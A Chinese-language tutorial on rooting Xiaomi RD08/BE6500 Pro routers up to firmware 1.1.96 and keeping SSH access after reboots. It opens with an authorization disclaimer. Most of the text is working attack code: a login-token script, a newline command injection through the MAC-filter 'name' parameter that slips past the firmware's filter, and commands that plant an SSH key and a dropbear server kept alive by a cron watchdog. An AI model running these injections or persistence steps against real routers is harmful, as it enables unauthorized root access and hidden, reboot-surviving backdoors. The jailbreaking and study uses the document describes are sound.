# 从零开始：RD08 / BE6500 Pro 取 root 并固化 SSH（≤ 1.1.96）

> ## 使用边界（请先读完）
>
> - 本文仅适用于**你拥有**或**已获得书面授权**的设备。在他人设备上执行任何一步，都属于未授权访问，
>   可能违反《网络安全法》《刑法》第 285/286 条。
> - 受影响版本 **≤ 1.1.96**，**1.1.123 已移除相关接口**，本文在 1.1.123 上不适用。
> - 建议先在**离线/隔离**的设备上操作。root 后设备不再受原厂安全策略保护。
> - 作者不对任何滥用或由此产生的后果负责。

完整链路：**登录取 token → 命令注入拿 root → 装 dropbear → cron 固化 → 重启验证**。

---

## 0. 前置条件

| 项 | 要求 |
|---|---|
| 固件 | ≤ 1.1.96（`api/xqsystem/init_info` 返回的 `romversion`） |
| 管理密码 | 已知（本文不涉及爆破/绕过后台认证） |
| 网络 | 与路由器同网段，能访问 80 端口 |
| 工具 | `curl`、`python3`、`ssh-keygen` |

先确认版本：

```sh
curl -s http://192.168.1.10/cgi-bin/luci/api/xqsystem/init_info | python3 -m json.tool | grep romversion
```

## 1. 登录取 `stok`

小米路由的登录不是明文密码，而是：

```
hash1 = sha256(密码 + key)
hash2 = sha256(nonce + hash1)
nonce = "0_<deviceId>_<时间戳>_<随机数>"
```

`key` 和 `deviceId` 在 `/cgi-bin/luci/web` 页面里。

```python
# login.py —— 用法: python3 login.py 192.168.1.10 '管理密码'
import re, sys, time, random, hashlib, requests

host, pw = sys.argv[1], sys.argv[2]
base = f"http://{host}"

page = requests.get(f"{base}/cgi-bin/luci/web", timeout=8).text
key = re.search(r"key: '(.*)',", page).group(1)
dev = re.search(r"var deviceId = '(.*?)'", page).group(1)

nonce = f"0_{dev}_{int(time.time())}_{random.randint(1000, 10000)}"
h = lambda s: hashlib.sha256(s.encode()).hexdigest()
pwd = h(nonce + h(pw + key))

r = requests.get(
    f"{base}/cgi-bin/luci/api/xqsystem/login",
    params={"username": "admin", "password": pwd, "logtype": 2, "nonce": nonce},
    timeout=8,
)
print(r.text)          # {"token":"<STOK>", ...}
```

> **坑**：1.1.96 上这个接口只接受 **GET**，用 POST 会返回 `{"code":401,"msg":"Invalid token"}`。

拿到返回里的 `token`，后面所有请求都拼成 `http://<IP>/cgi-bin/luci/;stok=<STOK>/...`。

## 2. 验证命令注入

`api/xqsystem/set_macfilter_rules` 的 `name` 参数（MAC 过滤规则名）会被原样拼进 shell 命令：

```sh
STOK=<上一步的 token>
curl -s "http://192.168.1.10/cgi-bin/luci/;stok=$STOK/api/xqsystem/set_macfilter_rules" \
  --data-urlencode 'mac=02:11:22:33:44:55' \
  --data-urlencode 'name=
id > /tmp/poc.out 2>&1' \
  --data-urlencode 'option=0'
# → {"code":0}
```

确认：

```sh
curl -s "http://192.168.1.10/cgi-bin/luci/;stok=$STOK/api/xqsystem/set_macfilter_rules" \
  --data-urlencode 'mac=02:11:22:33:44:55' \
  --data-urlencode 'name=
cat /tmp/poc.out | base64 -w0' \
  --data-urlencode 'option=0'
```

回显里能看到 `uid=0(root)` 就说明拿到了 root 执行权限。

> 说明：`name` 里用换行分隔多条命令；分号会被上游的 `cmdSafeCheck` 拦掉，换行不会。
> `mac` 用合成地址（`02:` 开头是本地管理地址段），不影响真实设备。

**清理**：以同一 MAC 发 `option=1` 删除规则，`/etc/config/macfilter` 不留痕迹。

## 3. 装一个 key-only 的 dropbear

原厂在 release 通道把 dropbear 关了（`/etc/init.d/dropbear` 里判断 `channel = release` 直接 return），
所以要自己起一个。这里的关键是：`/root` 只读、`/etc` 是 ramfs，不能按常规往 `~/.ssh` 放公钥。

先在本机生成密钥：

```sh
ssh-keygen -t rsa -b 3072 -f ~/.ssh/id_rd08 -N ''
```

把公钥传上去（通过注入通道）：

```sh
PUB=$(cat ~/.ssh/id_rd08.pub | base64 -w0)
curl -s "http://192.168.1.10/cgi-bin/luci/;stok=$STOK/api/xqsystem/set_macfilter_rules" \
  --data-urlencode 'mac=02:11:22:33:44:56' \
  --data-urlencode "name=
mkdir -p /data/admin-ssh/backup
echo '$PUB' | base64 -d > /data/admin-ssh/authorized_keys
chmod 600 /data/admin-ssh/authorized_keys
cp -a /etc/crontabs/root /data/admin-ssh/backup/crontab-root.before
" \
  --data-urlencode 'option=0'
```

## 4. 固化：cron 看门狗

看门狗要做三件事：重建 `/etc` 下的软链、生成 hostkey、保证 dropbear 在跑。
把它先在本机写好，再 base64 传上去，避免转义地狱。

**本机：**

```sh
cat > start-ssh.sh <<'EOS'
#!/bin/sh
B=/data/admin-ssh
K=$B/dropbear_rsa_host_key
[ -s "$K" ] || /usr/bin/dropbearkey -t rsa -s 3072 -f "$K" >/dev/null 2>&1
mkdir -p /etc/dropbear
ln -sf "$B/authorized_keys" /etc/dropbear/authorized_keys
awk '$2 ~ /:56CE$/ && $4 == "0A" {f=1} END{exit !f}' /proc/net/tcp && exit 0
exec /usr/sbin/dropbear -s -g -j -k -T 3 -I 600 -K 60 -r "$K" -p 192.168.1.10:22222 -P /tmp/admin-ssh.pid
EOS
B64=$(base64 -w0 start-ssh.sh)
```

**注入落地：**

```sh
curl -s "http://192.168.1.10/cgi-bin/luci/;stok=$STOK/api/xqsystem/set_macfilter_rules" \
  --data-urlencode 'mac=02:11:22:33:44:57' \
  --data-urlencode "name=
mkdir -p /data/admin-ssh
echo '$B64' | base64 -d > /data/admin-ssh/start-ssh.sh
chmod 700 /data/admin-ssh/start-ssh.sh
grep -q admin-ssh/start-ssh.sh /etc/crontabs/root || echo '* * * * * /data/admin-ssh/start-ssh.sh >/dev/null 2>&1' >> /etc/crontabs/root
touch /etc/crontabs
sh /data/admin-ssh/start-ssh.sh
" \
  --data-urlencode 'option=0'
```

`start-ssh.sh` 里的 IP 和端口要改成你自己的；`:56CE` 是 22222 的十六进制。

更省事的做法是用仓库里的 `scripts/install.sh`：先用注入把脚本落盘，再执行：

```sh
sh /tmp/install.sh    # AP_IP=... PUBKEY_FILE=... 由调用方传入
```

## 5. 连接

```sh
ssh -i ~/.ssh/id_rd08 -p 22222 \
    -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    root@192.168.1.10
```

高版本 OpenSSH 必须带这两个 `+ssh-rsa`：该固件的 dropbear 2017.75 只支持 SHA1 签名。

## 6. 验证

```sh
# 1) 杀进程，cron 应在一分钟内拉起
ssh ... 'killall dropbear'
for i in $(seq 1 14); do sleep 5; nc -z -G 2 192.168.1.10 22222 && echo "恢复 +$((i*5))s" && break; done

# 2) 重启验证（会断网约 2 分钟）
ssh ... 'reboot'
# 恢复后确认软链 mtime 是重启后的时间
ssh ... 'uptime; ls -l /etc/dropbear/authorized_keys'
```

## 7. 回滚

```sh
sed -i '/admin-ssh\/start-ssh.sh/d' /etc/crontabs/root
touch /etc/crontabs
killall dropbear
rm -rf /data/admin-ssh
```

## 8. 常见坑

| 现象 | 原因 | 处理 |
|---|---|---|
| `mkdir: /root/.ssh: Read-only file system` | `/root` 在 squashfs 上 | 公钥放 `/data`，用软链 |
| 重启后 SSH 没了 | `/etc` 是 ramfs | cron 每分钟重建软链 |
| 加了 crontab 不生效 | busybox crond 只看**目录** mtime | `touch /etc/crontabs` 或重启 cron |
| `no matching host key type` | 老 dropbear 只有 ssh-rsa | 客户端加 `+ssh-rsa` |
| 注入 `{"code":1523}` | 参数被 `cmdSafeCheck` 拦了（`; < > \| $ &`） | 用换行分隔命令 |
| 登录 `{"code":401}` | 用了 POST | 改 GET |

## 9. 升级说明

1.1.123 起，`api/xqsystem/*` 下 14 条过滤/防火墙路由被移除，本文第 2~4 步在 1.1.123 上不再可用；
已固化的设备在升级后**可能**仍然保留 `/data` 与 crontab（独立分区），但不保证。
